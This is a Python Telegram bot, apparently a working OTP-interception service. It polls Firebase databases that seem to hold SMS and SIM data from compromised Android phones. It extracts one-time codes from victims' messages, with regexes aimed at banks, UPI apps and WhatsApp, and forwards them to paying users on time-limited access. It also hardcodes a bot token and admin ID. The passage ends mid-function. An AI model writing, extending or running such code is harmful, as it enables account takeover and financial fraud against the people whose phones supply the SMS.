#!/usr/bin/env python3
"""
OTP Forwarding Bot - Premium Multi-System v5.0

v5.0 changes:
- INITIAL SMS SCAN REMOVED. The bot starts instantly. Each device is lazily
  seeded on its first poll (old SMS are marked seen, never forwarded).
- TIME-BASED USER ACCESS. Admin approves users and sets how long (hours/days)
  they can use the bot. Access auto-expires and is enforced everywhere.
- SEPARATE SYSTEM PER FIREBASE. Every Firebase URL becomes its own isolated
  system with its own devices, numbers and OTP service. Users are assigned to
  a system and only ever see/use that system's numbers.
- SMS HISTORY. Every SMS is recorded and viewable (per system / per number).
- PREMIUM CLEAN UI. HTML-formatted messages, tidy keyboards, dashboards.
"""

import re, time, asyncio, logging, json, os, hashlib, html
from typing import Optional, Dict, List, Set, Tuple
from collections import deque
from datetime import datetime
import aiohttp
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from databases import DATABASES

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger("OTPFwd")

# ── CONFIG ──────────────────────────────────────────────────────────────────
ADMIN_ID = 6582969543
TOKEN = "8597129727:AAHZ6l73aLE_Dke3CedFkn57odm8Nu7Ua70"
FB_TIMEOUT = 20
POLL_INTERVAL = 0.5
MAX_CONCURRENT_POLL = 40
MAX_CONCURRENT_DB = 20
SMS_SEEN_MAX = 300000
AUTO_TIMEOUT = 300
HOT_WINDOW = 300
OTP_DEDUP_WINDOW = 600
OTP_DEDUP_MAX = 200000
FIREBASE_STORE = "firebase_urls.json"
ACCESS_STORE = "access.json"
HISTORY_MAX = 3000

DIV = "━━━━━━━━━━━━━━━━━━━━━━"

def esc(s) -> str:
    return html.escape(str(s))

# ── DATA STRUCTURES ─────────────────────────────────────────────────────────
class DeviceInfo:
    __slots__ = ['dev_id', 'numbers', 'status', 'base_url', 'db_tag',
                 'sms_paths', 'keys', 'last_sms_hash', 'last_poll_time', 'poll_count',
                 'seeded', 'has_sms']
    def __init__(self, dev_id, numbers, status, base_url, db_tag, sms_paths, keys):
        self.dev_id = dev_id
        self.numbers = numbers
        self.status = status
        self.base_url = base_url
        self.db_tag = db_tag
        self.sms_paths = sms_paths
        self.keys = keys
        self.last_sms_hash = None
        self.last_poll_time = 0
        self.poll_count = 0
        self.seeded = False
        self.has_sms = False

class NumberProfile:
    """Tracks OTP activity for a single number (no scoring)."""
    __slots__ = ['number', 'total_otps', 'last_otp_time', 'last_otp_code',
                 'last_otp_sender', 'otp_history', 'assigned_to']
    def __init__(self, number: str):
        self.number = number
        self.total_otps = 0
        self.last_otp_time = 0.0
        self.last_otp_code = ""
        self.last_otp_sender = ""
        self.otp_history: deque = deque(maxlen=50)
        self.assigned_to: Optional[int] = None

    def record_otp(self, code: str, sender: str = "") -> bool:
        """Record an OTP. Returns True if genuinely new (number,code) pair."""
        if not otp_code_seen(self.number, code):
            return False
        now = time.time()
        self.total_otps += 1
        self.last_otp_code = code
        self.last_otp_sender = sender
        self.last_otp_time = now
        self.otp_history.append(now)
        return True

    @property
    def seconds_since_last_otp(self) -> float:
        if self.last_otp_time == 0:
            return 999999
        return time.time() - self.last_otp_time

    @property
    def recent_otp_count(self) -> int:
        now = time.time()
        return sum(1 for t in self.otp_history if now - t < HOT_WINDOW)

    @property
    def live_status_emoji(self) -> str:
        if self.last_otp_time == 0:
            return "\U0001F480"
        secs = time.time() - self.last_otp_time
        if secs < 60:
            return "\U0001F525"
        elif secs < 300:
            return "\U0001F7E2"
        elif secs < 900:
            return "\U0001F7E1"
        elif secs < 3600:
            return "\U0001F7E0"
        else:
            return "\U0001F480"

class System:
    """One isolated Firebase system: its own devices, numbers and service."""
    __slots__ = ['sid', 'name', 'url', 'keys', 'devices', 'numbers', 'stats', 'live_numbers']
    def __init__(self, sid, name, url, keys):
        self.sid = sid
        self.name = name
        self.url = url
        self.keys = keys
        self.devices: List[DeviceInfo] = []
        self.numbers: Dict[str, NumberProfile] = {}
        self.stats = {"devices": 0, "online": 0, "numbers": 0, "live": 0}
        self.live_numbers: Set[str] = set()

# ── GLOBAL STATE ────────────────────────────────────────────────────────────
SYSTEMS: Dict[str, System] = {}
USER_WAITING: Dict[int, Tuple[str, str]] = {}   # uid -> (sid, number)
USER_WAIT_TIME: Dict[int, float] = {}
SEEN_SMS: Set[str] = set()
_seen_sms_list: List[str] = []
_seen_sms_max = SMS_SEEN_MAX

# Rotation: last time each (sid, number) was handed out, to avoid repeats
_num_last_given: Dict[Tuple[str, str], float] = {}

# SMS history (global, capped)
_sms_history: deque = deque(maxlen=HISTORY_MAX)

# ── OTP CODE DEDUP ──────────────────────────────────────────────────────────
_OTP_CODE_SEEN: Dict[Tuple[str, str], float] = {}

def otp_code_seen(number: str, code: str) -> bool:
    key = (number, code)
    now = time.time()
    if key in _OTP_CODE_SEEN:
        if now - _OTP_CODE_SEEN[key] < OTP_DEDUP_WINDOW:
            return False
    _OTP_CODE_SEEN[key] = now
    if len(_OTP_CODE_SEEN) > OTP_DEDUP_MAX:
        cutoff = now - OTP_DEDUP_WINDOW
        for k in [k for k, v in _OTP_CODE_SEEN.items() if v < cutoff]:
            del _OTP_CODE_SEEN[k]
    return True

_session: Optional[aiohttp.ClientSession] = None
_app: Optional[Application] = None
_scan_done = False
_scan_running = False
_rescan_pending = False
_user_list: Dict[int, list] = {}
_user_page: Dict[int, int] = {}

# ── ACCESS MANAGEMENT ───────────────────────────────────────────────────────
# uid -> {"expires": ts (0 = never), "system": sid, "name": str}
_access: Dict[int, Dict] = {}
# uid -> {"name": str, "ts": ts}
_pending: Dict[int, Dict] = {}

def load_access():
    global _access, _pending
    try:
        if os.path.exists(ACCESS_STORE):
            with open(ACCESS_STORE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                _access = {int(k): v for k, v in data.get("access", {}).items()}
                _pending = {int(k): v for k, v in data.get("pending", {}).items()}
                logger.info(f"Loaded {len(_access)} access entries, {len(_pending)} pending")
    except Exception as e:
        logger.warning(f"Could not load {ACCESS_STORE}: {e}")

def save_access():
    try:
        with open(ACCESS_STORE, "w", encoding="utf-8") as f:
            json.dump({"access": {str(k): v for k, v in _access.items()},
                       "pending": {str(k): v for k, v in _pending.items()}}, f, indent=2)
    except Exception as e:
        logger.warning(f"Could not save {ACCESS_STORE}: {e}")

def is_authorized(uid: int) -> bool:
    if uid == ADMIN_ID:
        return True
    entry = _access.get(uid)
    if not entry:
        return False
    exp = entry.get("expires", 0)
    if exp and exp < time.time():
        return False
    return True

def access_remaining(uid: int) -> Optional[float]:
    if uid == ADMIN_ID:
        return None  # unlimited
    entry = _access.get(uid)
    if not entry:
        return 0
    exp = entry.get("expires", 0)
    if not exp:
        return None
    return max(0, exp - time.time())

def parse_duration(text: str) -> Optional[int]:
    """Parse '2d', '12h', '30m', '1w', '90' (default days) -> seconds."""
    if not text:
        return None
    text = text.strip().lower()
    m = re.fullmatch(r"(\d+)\s*([smhdw]?)", text)
    if not m:
        return None
    n = int(m.group(1))
    unit = m.group(2) or "d"
    mult = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}[unit]
    return n * mult

def fmt_duration(secs: float) -> str:
    if secs is None:
        return "∞ unlimited"
    secs = int(secs)
    if secs <= 0:
        return "expired"
    d, secs = divmod(secs, 86400)
    h, secs = divmod(secs, 3600)
    m, s = divmod(secs, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if not parts: parts.append(f"{s}s")
    return " ".join(parts)

# ── FIREBASE URL MANAGEMENT ─────────────────────────────────────────────────
_firebase_urls: List[Dict] = []
_admin_state: Dict[int, str] = {}
_admin_data: Dict[int, dict] = {}

def load_firebase_urls():
    global _firebase_urls
    try:
        if os.path.exists(FIREBASE_STORE):
            with open(FIREBASE_STORE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                _firebase_urls = [d for d in data if isinstance(d, dict) and d.get("url")]
                logger.info(f"Loaded {len(_firebase_urls)} saved Firebase URL(s)")
    except Exception as e:
        logger.warning(f"Could not load {FIREBASE_STORE}: {e}")

def save_firebase_urls():
    try:
        with open(FIREBASE_STORE, "w", encoding="utf-8") as f:
            json.dump(_firebase_urls, f, indent=2)
    except Exception as e:
        logger.warning(f"Could not save {FIREBASE_STORE}: {e}")

def parse_firebase_url(raw: str) -> Optional[str]:
    if not raw:
        return None
    raw = raw.strip()
    if not raw.lower().startswith("http"):
        raw = "https://" + raw
    raw = raw.rstrip("/")
    if raw.endswith(".json"):
        raw = raw[:-5]
    if "." not in raw.split("//", 1)[-1]:
        return None
    return raw

def build_systems():
    """Rebuild SYSTEMS from built-in DATABASES + admin-added Firebase URLs."""
    global SYSTEMS
    merged: Dict[str, Dict] = {}
    for tag, cfg in DATABASES.items():
        merged[tag] = {"name": tag, "url": cfg["url"], "keys": cfg.get("keys", []) or []}
    for i, entry in enumerate(_firebase_urls):
        sid = f"custom_{i+1}"
        merged[sid] = {"name": entry.get("name") or f"System {i+1}",
                       "url": entry["url"], "keys": entry.get("keys", []) or []}
    new_systems: Dict[str, System] = {}
    for sid, cfg in merged.items():
        if sid in SYSTEMS:
            s = SYSTEMS[sid]
            s.name = cfg["name"]; s.url = cfg["url"]; s.keys = cfg["keys"]
            new_systems[sid] = s
        else:
            new_systems[sid] = System(sid, cfg["name"], cfg["url"], cfg["keys"])
    SYSTEMS = new_systems

def system_list() -> List[System]:
    return list(SYSTEMS.values())

def system_by_index(i: int) -> Optional[System]:
    lst = system_list()
    if 0 <= i < len(lst):
        return lst[i]
    return None

def best_system_with_numbers() -> Optional[System]:
    """Return the system with the most free numbers (fallback for users whose
    assigned system has none). Prefers systems that actually have numbers."""
    best = None
    best_score = -1
    for s in system_list():
        free = sum(1 for p in s.numbers.values() if p.assigned_to is None)
        live_free = sum(1 for n in s.live_numbers
                        if n in s.numbers and s.numbers[n].assigned_to is None)
        # Weight live numbers heavily so users land on SMS-capable systems.
        score = live_free * 1000 + free
        if score > best_score:
            best_score = score
            best = s
    if best is not None and best_score > 0:
        return best
    # No system has free numbers; return any system that has numbers at all
    for s in system_list():
        if s.numbers:
            return s
    return best

def _looks_like_firebase(text: str) -> bool:
    """True if the message looks like a Firebase Realtime DB link."""
    t = (text or "").strip().lower()
    if not t:
        return False
    if t.startswith("http://") or t.startswith("https://"):
        return "firebaseio.com" in t or "firebasedatabase.app" in t
    return ("firebaseio.com" in t or "firebasedatabase.app" in t) and "." in t

def find_system_by_url(url: str) -> Optional[System]:
    if not url:
        return None
    u = url.rstrip("/").lower()
    for s in system_list():
        if s.url.rstrip("/").lower() == u:
            return s
    return None

def add_custom_firebase(url: str, name: str = "", keys=None) -> Optional[System]:
    """Register a user-pasted Firebase as a custom system (if not already known)."""
    keys = keys or []
    existing = find_system_by_url(url)
    if existing:
        return existing
    _firebase_urls.append({"url": url, "name": name or "", "keys": keys})
    save_firebase_urls()
    build_systems()
    return find_system_by_url(url)

def get_user_system(uid: int) -> Optional[System]:
    entry = _access.get(uid)
    if entry and entry.get("system") in SYSTEMS:
        s = SYSTEMS[entry["system"]]
        # If the user is LOCKED to a Firebase, always use it (no fallback).
        # They get numbers only from this Firebase until they log out.
        if entry.get("locked"):
            return s
        # If the assigned system has numbers, use it. Otherwise fall back to a
        # system that actually has numbers so the user can still get a number.
        if s.numbers:
            return s
        fallback = best_system_with_numbers()
        if fallback is not None and fallback.numbers:
            return fallback
        return s
    lst = system_list()
    if lst:
        # Prefer a system that has numbers
        fallback = best_system_with_numbers()
        if fallback is not None and fallback.numbers:
            return fallback
        return lst[0]
    return None

def seen_add(sid: str):
    if sid not in SEEN_SMS:
        SEEN_SMS.add(sid)
        _seen_sms_list.append(sid)
        if len(_seen_sms_list) > _seen_sms_max:
            old = _seen_sms_list[:_seen_sms_max // 2]
            for o in old:
                SEEN_SMS.discard(o)
            del _seen_sms_list[:_seen_sms_max // 2]

def add_sms_history(sid, num, sender, body, otp):
    _sms_history.append({"ts": time.time(), "sid": sid, "num": num,
                         "sender": sender, "body": body, "otp": otp})

# ── SSL / SESSION ───────────────────────────────────────────────────────────
async def get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=300, keepalive_timeout=30)
        )
    return _session

# ── FIREBASE GET ────────────────────────────────────────────────────────────
async def fb_get(path: str, base: str, keys: list, retries: int = 2) -> Optional[dict]:
    s = await get_session()
    urls = []
    if not keys:
        urls.append(f"{base}/{path}.json" if path else f"{base}/.json")
    else:
        for k in keys:
            urls.append(f"{base}/{path}.json?auth={k}" if path else f"{base}/.json?auth={k}")
    for attempt in range(retries):
        for url in urls:
            try:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=FB_TIMEOUT)) as r:
                    if r.status == 200:
                        data = await r.json(content_type=None)
                        return data if isinstance(data, dict) else None
                    elif r.status == 401:
                        continue
                    elif r.status == 404:
                        return None
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
            except Exception:
                pass
        if attempt < retries - 1:
            await asyncio.sleep(0.2 * (attempt + 1))
    return None

# ── EXTRACTION ──────────────────────────────────────────────────────────────
KEYS_CHECK = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
              "mobNo", "phoneNumber", "phone", "mobile"]

def extract_nums(*dicts) -> List[str]:
    nums = []
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in KEYS_CHECK:
            v = str(d.get(k, ""))
            c = re.sub(r"\D", "", v)
            if len(c) >= 10:
                nums.append(c[-10:])
    return list(set(nums))

def extract_otp(body: str) -> Optional[str]:
    kw_match = re.search(
        r"(?:otp|verif(?:ication|y)?|code|pin|passcode|token|one.time|secret)"
        r"[^\d]{0,20}(\d{4,8})\b", body, re.I)
    if kw_match:
        return kw_match.group(1)
    branded_match = re.search(
        r"(?:whatsapp|google|facebook|fb|amazon|flipkart|instagram|twitter|telegram"
        r"|bank|paytm|phonepe|gpay|upi|sbm|hdfc|icici|axis|sbi|pnb|bob)"
        r"[^\d]{0,30}(\d{4,6})\b", body, re.I)
    if branded_match:
        return branded_match.group(1)
    if len(body) > 200:
        return None
    fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
    if fallback:
        code = fallback.group(1)
        try:
            val = int(code)
            if 1900 <= val <= 2099:
                return None
            if val % 1000 == 0 or val % 500 == 0:
                return None
            if val < 1300 and len(code) == 4:
                return None
        except Exception:
            pass
        return code
    return None

# ── ADMIN NOTIFY ────────────────────────────────────────────────────────────
async def send_admin(text: str):
    if _app:
        try:
            await _app.bot.send_message(ADMIN_ID, text[:4000], parse_mode="HTML")
        except Exception:
            pass

# ── KEYBOARD BUILDERS ───────────────────────────────────────────────────────
BTN_GET = "\U0001F525 Get Number"
BTN_MY = "\U0001F4CA My Status"
BTN_HISTORY = "\U0001F4DC SMS History"
BTN_CANCEL = "\u274C Cancel"
BTN_DASH = "\U0001F4C8 Dashboard"
BTN_SYSTEMS = "\U0001F5C2 Systems"
BTN_USERS = "\U0001F465 Users"
BTN_APPROVE = "\u2705 Approve"
BTN_REVOKE = "\U0001F6AB Revoke"
BTN_SETDUR = "\u23F3 Set Duration"
BTN_SETSYS = "\U0001F5C2 Set System"
BTN_ADDFB = "\u2795 Add Firebase"
BTN_RMFB = "\U0001F5D1 Remove Firebase"
BTN_RESCAN = "\U0001F504 Rescan"
BTN_MENU = "\U0001F3E0 Menu"
BTN_PREV = "\u2B05\uFE0F Prev"
BTN_NEXT = "\u27A1\uFE0F Next"
BTN_STOP = "\u274C Stop"
BTN_NEWNUM = "\U0001F525 New Number"
BTN_REQ = "\U0001F513 Request Access"
BTN_LOGOUT = "\U0001F6AA Logout"

def _kb(rows, placeholder="Choose an option"):
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True,
                               input_field_placeholder=placeholder)

def main_keyboard(is_admin=False):
    if is_admin:
        rows = [
            [KeyboardButton(BTN_GET), KeyboardButton(BTN_MY)],
            [KeyboardButton(BTN_HISTORY), KeyboardButton(BTN_DASH)],
            [KeyboardButton(BTN_SYSTEMS), KeyboardButton(BTN_USERS)],
            [KeyboardButton(BTN_APPROVE), KeyboardButton(BTN_REVOKE)],
            [KeyboardButton(BTN_SETDUR), KeyboardButton(BTN_SETSYS)],
            [KeyboardButton(BTN_ADDFB), KeyboardButton(BTN_RMFB)],
            [KeyboardButton(BTN_RESCAN)],
        ]
    else:
        rows = [
            [KeyboardButton(BTN_GET)],
            [KeyboardButton(BTN_MY), KeyboardButton(BTN_HISTORY)],
            [KeyboardButton(BTN_CANCEL), KeyboardButton(BTN_LOGOUT)],
        ]
    return _kb(rows)

def back_keyboard():
    return _kb([[KeyboardButton(BTN_MENU)]])

def waiting_keyboard():
    return _kb([[KeyboardButton(BTN_MY), KeyboardButton(BTN_CANCEL)],
                [KeyboardButton(BTN_MENU)]])

def otp_received_keyboard():
    return _kb([[KeyboardButton(BTN_STOP)],
                [KeyboardButton(BTN_NEWNUM), KeyboardButton(BTN_MENU)]])

def request_keyboard():
    return _kb([[KeyboardButton(BTN_REQ)]])

def number_list_keyboard(numbers: List[Tuple[str, NumberProfile]], page=0, per_page=10):
    rows = []
    start = page * per_page
    end = min(start + per_page, len(numbers))
    for i in range(start, end):
        num, prof = numbers[i]
        emoji = prof.live_status_emoji
        secs = int(prof.seconds_since_last_otp)
        if secs < 60:
            t = f"{secs}s"
        elif secs < 3600:
            t = f"{secs // 60}m"
        else:
            t = f"{secs // 3600}h"
        label = f"{emoji} +91{num} · {t}"
        if prof.assigned_to:
            label += " [BUSY]"
        rows.append([KeyboardButton(label)])
    nav = []
    if page > 0:
        nav.append(KeyboardButton(BTN_PREV))
    if end < len(numbers):
        nav.append(KeyboardButton(BTN_NEXT))
    if nav:
        rows.append(nav)
    rows.append([KeyboardButton(BTN_MENU)])
    return _kb(rows, "Tap a number to assign")

# ── SYSTEM SCANNER ──────────────────────────────────────────────────────────
async def scan_all_systems():
    global _scan_done, _scan_running, _rescan_pending
    if _scan_running:
        _rescan_pending = True
        return
    _scan_running = True
    build_systems()
    logger.info("Starting full system scan...")
    sem = asyncio.Semaphore(MAX_CONCURRENT_DB)

    async def scan_one(system: System):
        async with sem:
            devs: List[DeviceInfo] = []
            try:
                sim_r, dev_r, usr_r, sms_r = await asyncio.gather(
                    fb_get("All_Users/simDetails", system.url, system.keys),
                    fb_get("All_Users/Data/DeviceInfo", system.url, system.keys),
                    fb_get("user_data", system.url, system.keys),
                    fb_get("user_sms", system.url, system.keys),
                    return_exceptions=True)
                sms_ids = set(sms_r.keys()) if isinstance(sms_r, dict) else set()
                if isinstance(sim_r, dict):
                    info_r = dev_r if isinstance(dev_r, dict) else {}
                    for did, sim in sim_r.items():
                        if not isinstance(sim, dict): continue
                        info = info_r.get(did) if isinstance(info_r, dict) else {}
                        if not isinstance(info, dict): info = {}
                        nums = extract_nums(sim, info)
                        st = "online" if str(info.get("Status", "")).lower() == "online" else "offline"
                        if nums:
                            devs.append(DeviceInfo(did, nums, st, system.url, system.sid,
                                [f"All_Users/sms/{did}"], system.keys))
                if isinstance(usr_r, dict):
                    for did, data in usr_r.items():
                        if not isinstance(data, dict): continue
                        nums = extract_nums(data)
                        st = "online" if str(data.get("status", "")).lower() == "online" else "offline"
                        if nums:
                            d = DeviceInfo(did, nums, st, system.url, system.sid,
                                [f"user_sms/{did}", f"All_Users/sms/{did}"], system.keys)
                            d.has_sms = did in sms_ids
                            devs.append(d)
            except Exception as e:
                logger.debug(f"scan_one {system.sid}: {e}")

            system.devices = devs
            online_nums = set()
            live_nums = set()
            for d in devs:
                if d.status == "online":
                    online_nums.update(d.numbers)
                    if d.has_sms:
                        live_nums.update(d.numbers)
            new_profiles = {}
            for n in online_nums:
                new_profiles[n] = system.numbers.get(n) or NumberProfile(n)
            system.numbers = new_profiles
            system.live_numbers = live_nums
            system.stats = {
                "devices": len(devs),
                "online": sum(1 for d in devs if d.status == "online"),
                "numbers": len(online_nums),
                "live": len(live_nums),
            }

    await asyncio.gather(*[scan_one(s) for s in system_list()], return_exceptions=True)
    _scan_done = True
    _scan_running = False
    if _rescan_pending:
        _rescan_pending = False
        asyncio.create_task(scan_all_systems())
    total_devs = sum(len(s.devices) for s in system_list())
    total_online = sum(s.stats["online"] for s in system_list())
    total_nums = sum(len(s.numbers) for s in system_list())
    logger.info(f"Scan done: {len(SYSTEMS)} systems, {total_devs} devs, {total_online} online, {total_nums} numbers")
    await send_admin(
        f"\u2705 <b>Scan complete</b>\n{DIV}\n"
        f"\U0001F5C2 Systems: <b>{len(SYSTEMS)}</b>\n"
        f"\U0001F4BB Devices: <b>{total_online}</b> online / {total_devs} total\n"
        f"\U0001F4F1 Numbers: <b>{total_nums}</b>\n\n"
        f"\u26A1 Bot is LIVE and monitoring for OTPs!")

# ── NUMBER SELECTION ────────────────────────────────────────────────────────
def get_available_number(sid: str) -> Optional[str]:
    s = SYSTEMS.get(sid)
    if not s:
        return None
    # Prefer numbers on devices that actually receive SMS (live).
    live_free = [n for n in s.live_numbers
                 if n in s.numbers and s.numbers[n].assigned_to is None]
    pool = live_free
    if not pool:
        pool = [n for n, p in s.numbers.items() if p.assigned_to is None]
    if not pool:
        return None
    # Rotate: hand out the least-recently-given number first.
    pool.sort(key=lambda n: _num_last_given.get((sid, n), 0))
    chosen = pool[0]
    _num_last_given[(sid, chosen)] = time.time()
    return chosen

def get_all_numbers(sid: str) -> List[Tuple[str, NumberProfile]]:
    s = SYSTEMS.get(sid)
    if not s:
        return []
    free = [(n, p) for n, p in s.numbers.items() if p.assigned_to is None]
    # Live (SMS-ready) numbers first, then the rest.
    free.sort(key=lambda np: (np[0] not in s.live_numbers,
                              _num_last_given.get((sid, np[0]), 0)))
    return free

# ── BACKGROUND SMS MONITOR ──────────────────────────────────────────────────
async def monitor_sms_for_device(dev: DeviceInfo):
    """Poll SMS from one device. First poll seeds (marks seen) without forwarding."""
    hash_parts = []
    new_sms_list = []

    for sms_path in dev.sms_paths:
        data = await fb_get(sms_path, dev.base_url, dev.keys)
        if isinstance(data, dict):
            hash_parts.append(str(sorted(data.items())))
            for sms_key, sms in data.items():
                if not isinstance(sms, dict):
                    continue
                sid = f"{dev.db_tag}/{dev.dev_id}/{sms_path}/{sms_key}"
                if sid in SEEN_SMS:
                    continue
                seen_add(sid)
                new_sms_list.append(sms)
        else:
            hash_parts.append("")

    # Lazy seeding: on the very first poll, mark everything seen but don't forward.
    if not dev.seeded:
        dev.seeded = True
        if hash_parts and not all(p == "" for p in hash_parts):
            dev.last_sms_hash = hashlib.md5("|".join(hash_parts).encode()).hexdigest()
        return

    if not hash_parts or all(p == "" for p in hash_parts):
        return

    # This device has SMS data -> its numbers are live (SMS-capable).
    if not dev.has_sms:
        dev.has_sms = True
        s = SYSTEMS.get(dev.db_tag)
        if s:
            s.live_numbers.update(dev.numbers)

    combined = "|".join(hash_parts)
    data_hash = hashlib.md5(combined.encode()).hexdigest()
    if data_hash == dev.last_sms_hash and not new_sms_list:
        return
    dev.last_sms_hash = data_hash

    for sms in new_sms_list:
        body = str(sms.get("body") or sms.get("message") or sms.get("text") or sms.get("msg") or "")
        sender = str(sms.get("sender") or sms.get("from") or sms.get("address") or "")
        timestamp = str(sms.get("date") or sms.get("time") or sms.get("timestamp") or "")
        otp = extract_otp(body)

        # Record history for every SMS (even non-OTP)
        for num in dev.numbers:
            add_sms_history(dev.db_tag, num, sender, body, otp)

        if not otp:
            continue

        numbers_notified = []
        for num in dev.numbers:
            s = SYSTEMS.get(dev.db_tag)
            if s and num in s.numbers:
                if s.numbers[num].record_otp(otp, sender):
                    numbers_notified.append(num)

        if numbers_notified:
            logger.info(f"\U0001F525 NEW OTP: code={otp} \u2192 {', '.join('+91'+n for n in numbers_notified)}")

        # Forward to waiting users on this system + number
        for num in dev.numbers:
            for uid, (wsid, wnum) in list(USER_WAITING.items()):
                if wsid == dev.db_tag and wnum == num and _app:
                    logger.info(f"\U0001F4E7 Forward: +91{num} (sys {dev.db_tag}) -> user {uid}")
                    try:
                        await _app.bot.send_message(uid,
                            f"\u26A1 <b>OTP RECEIVED</b>\n{DIV}\n"
                            f"\U0001F4F1 Number: <code>+91{num}</code>\n"
                            f"\U0001F511 OTP: <code>{esc(otp)}</code>\n"
                            f"\U0001F4E4 Sender: {esc(sender)}\n"
                            f"\U0001F550 Time: {esc(timestamp)}\n\n"
                            f"\U0001F4AC <i>{esc(body[:300])}</i>",
                            parse_mode="HTML", reply_markup=otp_received_keyboard())
                    except Exception as e:
                        logger.warning(f"Failed to forward OTP to {uid}: {e}")

async def background_monitor_loop():
    await asyncio.sleep(3)
    logger.info("Background monitor loop started")
    cycle = 0
    while True:
        try:
            if not SYSTEMS:
                await asyncio.sleep(3)
                continue

            waiting = set(USER_WAITING.values())
            sem = asyncio.Semaphore(MAX_CONCURRENT_POLL)

            for system in system_list():
                online_devs = [d for d in system.devices if d.status == "online"]
                if not online_devs:
                    continue
                priority = [d for d in online_devs if any((system.sid, n) in waiting for n in d.numbers)]
                others = [d for d in online_devs if d not in priority]

                async def poll(dev):
                    async with sem:
                        await monitor_sms_for_device(dev)

                if priority:
                    await asyncio.gather(*[poll(d) for d in priority], return_exceptions=True)

                batch_size = MAX_CONCURRENT_POLL
                if others:
                    start_idx = (cycle * batch_size) % len(others)
                    batch = others[start_idx:start_idx + batch_size]
                    if len(batch) < batch_size and len(others) > batch_size:
                        batch += others[:batch_size - len(batch)]
                    if batch:
                        await asyncio.gather(*[poll(d) for d in batch], return_exceptions=True)

            cycle += 1

            # Auto-timeout
            now = time.time()
            for uid, (sid, num) in list(USER_WAITING.items()):
                if uid in USER_WAIT_TIME and now - USER_WAIT_TIME[uid] > AUTO_TIMEOUT:
                    del USER_WAITING[uid]
                    USER_WAIT_TIME.pop(uid, None)
                    s = SYSTEMS.get(sid)
                    if s and num in s.numbers:
                        s.numbers[num].assigned_to = None
                    try:
                        await _app.bot.send_message(uid,
                            f"\u23F0 <b>Timed out</b> waiting for OTP on <code>+91{num}</code>",
                            parse_mode="HTML", reply_markup=main_keyboard(uid == ADMIN_ID))
                    except Exception:
                        pass

            # Expiry notifier (every ~60 cycles)
            if cycle % 60 == 0:
                for uid in list(_access.keys()):
                    if uid == ADMIN_ID:
                        continue
                    rem = access_remaining(uid)
                    if rem is not None and rem <= 0:
                        try:
                            await _app.bot.send_message(uid,
                                "\u26D4 <b>Your access has expired.</b>\nContact admin to renew.",
                                parse_mode="HTML")
                        except Exception:
                            pass

            if cycle % 600 == 0:
                total_nums = sum(len(s.numbers) for s in system_list())
                in_use = sum(1 for s in system_list() for p in s.numbers.values() if p.assigned_to is not None)
                await send_admin(
                    f"\U0001F4CA <b>Monitor</b> ({cycle} cycles)\n{DIV}\n"
                    f"\U0001F5C2 Systems: {len(SYSTEMS)}\n"
                    f"\U0001F4F1 Numbers: {total_nums} | \U0001F512 In use: {in_use}\n"
                    f"\U0001F4E9 SMS seen: {len(SEEN_SMS)}\n"
                    f"\u23F3 Waiting: {len(USER_WAITING)}")

        except Exception as e:
            logger.error(f"Monitor loop error: {e}")

        await asyncio.sleep(POLL_INTERVAL)

# ── UI HELPERS ──────────────────────────────────────────────────────────────
def display_systems(only_active: bool = True, limit: int = 40) -> List[System]:
    """The list of systems shown to the admin (used for both display and
    index-based selection so the numbers always match)."""
    all_sys = system_list()
    if only_active:
        shown = [s for s in all_sys if s.numbers or s.stats.get("online")]
    else:
        shown = all_sys
    return shown[:limit]

def systems_text(only_active: bool = True, limit: int = 40) -> str:
    """List systems. By default only shows systems that have numbers or online
    devices, capped to `limit` entries to stay within Telegram's message size."""
    all_sys = system_list()
    shown = display_systems(only_active, limit)
    lines = [f"\U0001F5C2 <b>Systems</b> ({len(all_sys)} total, showing {len(shown)})\n{DIV}"]
    for i, s in enumerate(shown, 1):
        st = s.stats
        free = sum(1 for p in s.numbers.values() if p.assigned_to is None)
        mark = "\u2705" if free > 0 else ("\U0001F7E1" if s.numbers else "\u26AA")
        lines.append(
            f"{mark} <b>{i}. {esc(s.name)}</b>\n"
            f"   \U0001F4BB {st['online']} online / {st['devices']} dev\n"
            f"   \U0001F4F1 {len(s.numbers)} numbers \u00b7 {free} free\n"
            f"   \U0001F4E9 {len(s.live_numbers)} live (SMS-ready)")
    if len(all_sys) > len(shown):
        lines.append(f"\n<i>...and {len(all_sys) - len(shown)} more systems.</i>")
    return "\n".join(lines)

def users_text() -> str:
    lines = [f"\U0001F465 <b>Users</b>\n{DIV}"]
    if not _access:
        lines.append("<i>No approved users yet.</i>")
    for uid, e in _access.items():
        rem = access_remaining(uid)
        sysname = SYSTEMS.get(e.get("system"), None)
        sysname = sysname.name if sysname else (e.get("system") or "—")
        lock = " \U0001F512" if e.get("locked") else ""
        lines.append(
            f"\U0001F464 <b>{esc(e.get('name') or 'User')}</b> (<code>{uid}</code>){lock}\n"
            f"   \u23F3 {fmt_duration(rem)} · \U0001F5C2 {esc(sysname)}")
    if _pending:
        lines.append(f"\n\U0001F195 <b>Pending requests ({len(_pending)}):</b>")
        for uid, p in _pending.items():
            lines.append(f"   \U0001F464 {esc(p.get('name') or 'User')} (<code>{uid}</code>)")
    return "\n".join(lines)

def history_text(sid: Optional[str] = None, limit: int = 15) -> str:
    items = [h for h in _sms_history if (sid is None or h["sid"] == sid)]
    items = items[-limit:]
    if not items:
        return "\U0001F4DC <b>SMS History</b>\n" + DIV + "\n<i>No SMS recorded yet.</i>"
    lines = [f"\U0001F4DC <b>SMS History</b> (last {len(items)})\n{DIV}"]
    for h in reversed(items):
        t = datetime.fromtimestamp(h["ts"]).strftime("%H:%M:%S")
